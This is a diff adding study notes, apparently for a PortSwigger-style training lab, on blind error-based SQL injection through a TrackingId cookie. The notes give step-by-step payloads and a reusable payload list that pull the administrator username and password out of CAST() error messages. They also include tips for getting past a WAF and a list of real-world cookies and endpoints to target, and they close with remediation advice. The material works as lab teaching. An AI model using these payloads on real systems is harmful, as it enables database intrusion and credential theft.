@@ -1814,3 +1814,151 @@ SUBSTR(password,P,1)='x'
 ' → dual → CASE WHEN → 1/0 error → length → chars → admin pw.
 
 ---
+
+# Blind Error-Based SQL Injection — TrackingId Cookie (PortSwigger / lab-style)
+
+---
+
+## 🔹 One-line summary
+Blind error-based SQL injection inside the TrackingId cookie leaks the administrator username and password via SQL CAST() errors.
+
+---
+
+## 🔹 What is this topic? (short)
+This lab demonstrates SQL injection inside a cookie.  
+The backend inserts TrackingId directly into a SQL query.  
+The page does not display query results, but *database error messages leak internal data* such as usernames and passwords.
+
+---
+
+## 🔹 Why this matters (real-world risk)
+- Attackers can leak *usernames, **password hashes, **admin credentials*  
+- Analytics/tracking cookies are often trusted → directly concatenated into SQL  
+- A single error-based leak can escalate to *full account takeover*  
+- Common in CRMs, analytics scripts, legacy PHP/Java sites, and internal monitoring tools
+
+---
+
+## 🔹 High-value injection points
+- Cookies: TrackingId, VisitorId, SessionToken, UID, CampaignId
+- Endpoints that process these cookies:  
+  /, /analytics, /track, /logs, /session/track, /monitor/events, /reporting
+
+---
+
+## 🔹 Quick concept checklist
+- Test with ' → confirm SQL error  
+- Use SQL comment -- to truncate rest  
+- Use CAST() to force integer conversion errors  
+- Compare *error* vs *no-error* to leak data  
+- Remove original cookie value when query is too long  
+- Use LIMIT 1 to force single-row extraction
+
+---
+
+## 🔹 Lab walkthrough — exact steps (copy-paste ready)
+
+1. *Capture homepage request*  
+   Get the request containing the TrackingId=<value> cookie in Burp → Repeater.
+
+2. *Test injection*  
+   Add a quote:  
+   
+   TrackingId=xyz'
+   
+   Error appears → SQLi confirmed.
+
+3. *Stabilize query using SQL comment*  
+   
+   TrackingId=xyz'--
+   
+   No error → comment removed broken remainder.
+
+4. *CAST() boolean test*  
+   
+   TrackingId=xyz' AND CAST((SELECT 1) AS int)--
+   
+   Error appears → DB executed our expression.
+
+---
+
+5. *Fix boolean to avoid CAST mismatch*  
+   
+   TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--
+   
+   No error → valid boolean injected.
+
+6. *Try to leak username*  
+   
+   TrackingId=xyz' AND 1=CAST((SELECT username FROM users) AS int)--
+   
+   Error changes → query executed, but too long or multi-row.
+
+7. *Shorten cookie by removing original value*  
+   
+   TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+   
+
+---
+
+8. *Limit to one row*  
+   
+   TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+   
+   Error message reveals:  
+   *administrator*
+
+9. *Leak password*  
+   
+   TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+---
+
+10. *Login*  
+   Use extracted admin password → log in → lab solved.
+
+---
+
+## 🔹 Evidence
+1. *Screenshot — CAST no-error test*
+### 📸 Screenshot 1 — CAST() valid boolean (no error)
+![cast valid boolean](../images/cast_no_error.png)
+
+2. *Screenshot — erased TrackingId for username extraction*
+### 📸 Screenshot 2 — Erased TrackingId (query no longer auto-skipped)
+![erased query to stop auto-delete comment](../images/2_erased_trackingid.png) 
+
+3. *Screenshot — password leak via CAST()*
+### 📸 Screenshot 3 — Admin password leak via CAST()  
+![Admin password](../images/3_password_leaked.png)
+
+---
+
+## 🔹 PoC payloads (ready to reuse)
+
+
+'--
+' AND CAST((SELECT 1) AS int)--
+' AND 1=CAST((SELECT 1) AS int)--
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+
+---
+
+## 🔹 Troubleshooting
+- If no error → DB suppressing messages; try alternative conversion: CAST(... AS bigint)  
+- If multiple rows → use LIMIT 1 OFFSET n  
+- If cookie too long → erase original value  
+- If WAF blocks CAST → try CONVERT() or arithmetic errors (1/(SELECT ...))
+
+---
+
+## 🔹 Fixes / remediation
+- Use *prepared statements*  
+- Never interpolate cookie data into SQL  
+- Disable detailed SQL errors in production  
+- Validate cookie format (UUID)  
+- Apply least-privilege DB permissions
+
+---
